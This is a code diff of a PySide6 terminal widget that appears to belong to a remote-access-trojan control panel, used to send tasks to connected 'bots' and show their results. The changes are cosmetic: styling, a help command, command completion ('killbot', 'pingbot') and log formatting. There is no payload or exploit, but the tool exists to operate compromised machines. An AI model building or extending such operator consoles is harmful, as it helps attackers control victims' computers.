@@ -1,5 +1,5 @@
 from PySide6.QtWidgets import QWidget,QCompleter
-from PySide6.QtGui import QIcon,QFont
+from PySide6.QtGui import QIcon,QFont,QKeyEvent,QPalette,QColor
 from PySide6.QtCore import Qt
 from core.util import PattayaPanelUtil
 from designer.ui_terminal import Ui_BotTerminalWidget
@@ -21,9 +21,22 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         self.socket_io_client = SocketIOTerminalClient(self.bot)
 
         self.setWindowIcon(QIcon(":/assets/images/rat.png"))
-        self.task_result_text_browser.setStyleSheet("background-color: #000000;")
-        self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
-        self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")
+
+        stylesheet = """
+QTextEdit {
+    background-color: #000000;
+    color: #FB00FF;
+    font-family: 'Terminal', sans-serif;
+    font-size: 13px;
+}
+"""
+        self.task_result_text_browser.setStyleSheet(stylesheet)
+
+        palette = QPalette()
+        palette.setColor(QPalette.Highlight, QColor("#3E454C"))
+        self.task_result_text_browser.setPalette(palette)
+        # self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
+        # self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")
 
 
         self.socket_io_client.server_ack.connect(self.server_ack_bot_terminal)
@@ -35,9 +48,11 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         self.socket_io_client.start(self.url, self.token, self.namespace)
 
 
-        # command = ['help', 'cd', 'pwd', 'mkdir', 'start']
-        # completer = QCompleter(command)
-        # self.bot_send_task_line_edit.setCompleter(completer)
+        self.commands = ['killbot', 'pingbot', 'help']
+        self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
+        self.completer.setCompletionMode(QCompleter.InlineCompletion)
+
+        self.bot_send_task_line_edit.setCompleter(self.completer)
 
         self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint)
         self.bot_send_task_line_edit.returnPressed.connect(self.handle_bot_comamnd)
@@ -50,6 +65,8 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         
         self.task_result_text_browser.setFocusPolicy(Qt.FocusPolicy.NoFocus)
 
+        self.task_result_text_browser.append(PattayaPanelUtil.get_banner())
+
 
     def init_terminal(self, data):
         self.update_bot_terminal(data)
@@ -57,6 +74,12 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
     def handle_bot_comamnd(self):
         text = self.bot_send_task_line_edit.text()
         if text == '':
+            return
+        
+        if text == 'help':
+            self.update_bot_terminal(text)
+            self.task_result_text_browser.append(PattayaPanelUtil.get_terminal_help())
+            self.bot_send_task_line_edit.clear()
             return
         
         PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
@@ -105,20 +128,20 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
     def server_update_bot_terminal(self, result):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {result}</font><br>")
+        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F7810A'> ⮜⮜⮜</font></font><font color='#00E3FA'><br>{result}</font><br>")
         self.task_result_text_browser.ensureCursorVisible()
 
     def update_bot_terminal(self, command):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'><<<</font></font><font color='#00E3FA'> {command}</font>")
+        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F7810A'>⮞⮞⮞</font></font><font color='#00E3FA'> {command}</font>")
         self.task_result_text_browser.ensureCursorVisible()
 
 
     def update_bot_terminal_error(self, command):
         current_time = datetime.now()
         formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
-        self.task_result_text_browser.append(f"<font color='red'>[-] [{formatted_time}] Seem bot disconnected [{self.bot['username']}]</font><font color='#F6FA00'><<<</font></font><font color='#00E3FA'> {command}</font>")
+        self.task_result_text_browser.append(f"<font color='red'>[-] [{formatted_time}] Seem bot disconnected [{self.bot['username']}]</font><font color='#F6FA00'></font></font><font color='#00E3FA'> {command}</font>")
         self.task_result_text_browser.ensureCursorVisible()
 
 
@@ -126,3 +149,10 @@ class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
         self.bot_send_task_line_edit.setDisabled(True)
         self.update_bot_terminal_error("Bot bas been disconnected from server")
 
+
+
+    def keyPressEvent(self, event: QKeyEvent):
+        key = event.key()
+
+        if key == Qt.Key_Tab:
+            self.bot_send_task_line_edit.setCursorPosition(len(self.bot_send_task_line_edit.text()))
